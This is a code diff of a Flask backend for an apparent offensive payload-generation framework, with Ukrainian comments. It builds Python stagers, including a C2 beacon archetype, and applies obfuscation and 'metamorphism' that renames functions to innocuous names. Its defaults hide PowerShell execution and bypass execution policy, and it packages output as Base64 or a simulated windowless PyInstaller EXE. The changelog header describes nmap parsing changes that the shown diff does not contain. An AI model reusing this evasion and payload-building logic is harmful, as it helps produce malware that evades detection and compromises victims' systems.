@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.7.1
-# Призначення: Backend на Flask з концептуальною генерацією .EXE через PyInstaller.
-# Оновлення v1.7.1:
-#   - Додано новий формат виводу 'pyinstaller_exe_windows'.
-#   - Додано параметр 'pyinstaller_options'.
-#   - Модифіковано handle_generate_payload для симуляції компіляції PyInstaller.
-#   - Оновлено логування.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.2
+# Призначення: Backend на Flask з покращеним парсингом XML-виводу nmap.
+# Оновлення v1.7.2:
+#   - Уточнено логіку perform_nmap_scan_be для гарантованого використання XML для CVE-пошуку.
+#   - Покращено parse_nmap_xml_output_for_services для більш детального вилучення даних.
+#   - Адаптовано conceptual_cve_lookup_be для кращого зіставлення з даними з XML.
+#   - Оновлено тип розвідки port_scan_nmap_cve_basic для використання XML-парсингу.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -20,14 +20,14 @@ import shlex
 import ipaddress
 import socket
 import xml.etree.ElementTree as ET
-import tempfile # Для концептуальної роботи з тимчасовими файлами
-import os # Для роботи з шляхами
+import tempfile
+import os
 
-VERSION_BACKEND = "1.7.1"
+VERSION_BACKEND = "1.7.2"
 
 simulated_implants_be = []
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.6.8)
+CONCEPTUAL_CVE_DATABASE_BE = {
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -36,7 +36,7 @@ CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.6.8)
     "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
 }
 
-def initialize_simulated_implants_be(): # Логіка (без змін)
+def initialize_simulated_implants_be(): # Логіка (без змін від v1.7.1)
     global simulated_implants_be
     simulated_implants_be = []
     os_types = ["Windows_x64_10.0.22631", "Linux_x64_6.5.0", "Windows_Server_2022_Datacenter", "macOS_sonoma_14.1_arm64"]
@@ -57,7 +57,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = {
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.1)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -108,20 +108,20 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass" 
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
-    "output_format": { # Додано новий формат
+    "output_format": {
         "type": str, "required": False,
         "allowed_values": ["raw_python_stager", "base64_encoded_stager", "pyinstaller_exe_windows"],
         "default": "raw_python_stager"
     },
-    "pyinstaller_options": { # Новий параметр для PyInstaller
+    "pyinstaller_options": {
         "type": str,
         "required": False,
-        "default": "--onefile --noconsole" # Типові опції для Windows EXE
+        "default": "--onefile --noconsole"
     },
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.6.9)
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.1)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка...", "template_type": "python_stager_c2_beacon"},
@@ -839,113 +839,44 @@ def handle_generate_payload():
         ])
         stager_code_raw = "\n".join(stager_code_lines)
 
-        # --- Концептуальна обробка PyInstaller ---
-        output_format = validated_params.get("output_format")
-        final_stager_output = ""
-
-        if output_format == "pyinstaller_exe_windows":
-            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE (концептуально).")
-            pyinstaller_options = validated_params.get("pyinstaller_options", "--onefile --noconsole").split()
-            
-            # Симуляція процесу PyInstaller
-            temp_py_filename = "temp_stager_for_pyinstaller.py"
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 1. Збереження Python-стейджера у тимчасовий файл: {temp_py_filename}")
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM]    Вміст (перші 100 символів): {stager_code_raw[:100]}...")
-            
-            # Формування симульованої команди PyInstaller
-            pyinstaller_cmd_sim = ["pyinstaller"] + pyinstaller_options + [temp_py_filename]
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 2. Симуляція виклику PyInstaller: {' '.join(pyinstaller_cmd_sim)}")
-            
-            # Симуляція успішної компіляції
-            time.sleep(0.5) # Імітація часу компіляції
-            compiled_exe_name_sim = temp_py_filename.replace(".py", ".exe")
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 3. PyInstaller (симуляція) завершено. Очікуваний файл: dist/{compiled_exe_name_sim}")
-            
-            # Замість реального EXE, повертаємо Base64 Python-коду стейджера
-            # В реальному сценарії тут був би код для читання .exe та його кодування в Base64
-            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM_OUTPUT] Повернення Base64 Python-стейджера як представлення EXE (довжина: {len(final_stager_output)}).")
-            # Додаємо примітку, що це концептуальний EXE
-            payloadGenerationLog_note = "\n[ПРИМІТКА] Повернений Base64 представляє Python-код стейджера, а не скомпільований .EXE. Це концептуальна реалізація."
-            if isinstance(log_messages, list) : log_messages.append(payloadGenerationLog_note)
-
-
-        elif output_format == "base64_encoded_stager":
-            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
-            log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
-        else: # raw_python_stager
-            final_stager_output = stager_code_raw
-            log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")
-
-
-        if validated_params.get('enable_stager_metamorphism', False) and output_format != "pyinstaller_exe_windows":
-            # Метаморфізм застосовується до Python коду перед компіляцією або Base64 кодуванням
-            # Якщо це PyInstaller, метаморфізм вже мав би бути застосований до stager_code_raw
-            log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму...")
-            # Важливо: якщо output_format == "pyinstaller_exe_windows", stager_code_raw вже пройшов метаморфізм,
-            # якщо він був увімкнений до симуляції PyInstaller. Повторно не потрібно.
-            # Поточна логіка застосує його, якщо enable_stager_metamorphism=True, незалежно від формату.
-            # Це може бути бажано, щоб сам Python-скрипт, що компілюється, був обфускований.
-
-            # Застосовуємо метаморфізм до stager_code_raw, якщо він ще не був застосований
-            # (у випадку PyInstaller, ми компілюємо вже метаморфізований код)
-            # Поточна структура коду застосує метаморфізм нижче, якщо прапорець встановлено.
-
-            # --- Застосування метаморфізму (якщо увімкнено) ---
-            # Цей блок має бути перед логікою PyInstaller, якщо ми хочемо компілювати обфускований код
-            # Перемістимо цей блок вище, щоб він виконувався до вибору формату виводу
-            pass # Логіка метаморфізму тепер викликається перед вибором формату
-
-
-        # --- Застосування метаморфізму (якщо увімкнено) ---
-        # Цей блок має виконуватися *перед* компіляцією PyInstaller або Base64 кодуванням Python стейджера
         if validated_params.get('enable_stager_metamorphism', False):
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
-            stager_code_raw_for_metamorph = stager_code_raw # Беремо поточний код стейджера
-            
+            stager_code_raw_for_metamorph = stager_code_raw
             stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
             stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
             stager_code_raw_for_metamorph = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
-
             final_decode_name = generate_random_var_name(prefix="unveil_")
             final_evasion_name = generate_random_var_name(prefix="audit_")
             final_execute_name = generate_random_var_name(prefix="dispatch_")
-
             stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime}\b", final_decode_name, stager_code_raw_for_metamorph)
             stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime}\b", final_evasion_name, stager_code_raw_for_metamorph)
             stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime}\b", final_execute_name, stager_code_raw_for_metamorph)
             log_messages.append(f"[BACKEND_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name}, {final_evasion_name}, {final_execute_name}).")
-            
-            stager_code_raw = stager_code_raw_for_metamorph # Оновлюємо основний код стейджера метаморфізованим варіантом
+            stager_code_raw = stager_code_raw_for_metamorph
 
-        # --- Форматування виводу (після метаморфізму) ---
+        output_format = validated_params.get("output_format")
+        final_stager_output = ""
         if output_format == "pyinstaller_exe_windows":
             log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE (концептуально).")
             pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
-            pyinstaller_options = shlex.split(pyinstaller_options_str) # Безпечний розбір опцій
-
+            pyinstaller_options = shlex.split(pyinstaller_options_str)
             temp_py_filename = "temp_stager_for_pyinstaller.py"
             log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 1. Збереження Python-стейджера (можливо, метаморфізованого) у тимчасовий файл: {temp_py_filename}")
             log_messages.append(f"[BACKEND_PYINSTALLER_SIM]    Вміст (перші 100 символів): {stager_code_raw[:100]}...")
-            
             pyinstaller_cmd_sim = ["pyinstaller"] + pyinstaller_options + [temp_py_filename]
             log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 2. Симуляція виклику PyInstaller: {' '.join(pyinstaller_cmd_sim)}")
-            
             time.sleep(0.5) 
             compiled_exe_name_sim = temp_py_filename.replace(".py", ".exe")
             log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 3. PyInstaller (симуляція) завершено. Очікуваний файл: dist/{compiled_exe_name_sim}")
-            
-            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8') # Повертаємо Base64 Python-коду
+            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
             log_messages.append(f"[BACKEND_PYINSTALLER_SIM_OUTPUT] Повернення Base64 Python-стейджера як представлення EXE (довжина: {len(final_stager_output)}).")
             log_messages.append("\n[ПРИМІТКА] Повернений Base64 представляє Python-код стейджера, а не скомпільований .EXE. Це концептуальна реалізація PyInstaller.")
-
         elif output_format == "base64_encoded_stager":
             final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
             log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
-        else: # raw_python_stager
+        else: 
             final_stager_output = stager_code_raw
             log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")
-
 
         log_messages.append("[BACKEND_SUCCESS] Пейлоад згенеровано.")
         time.sleep(0.2)
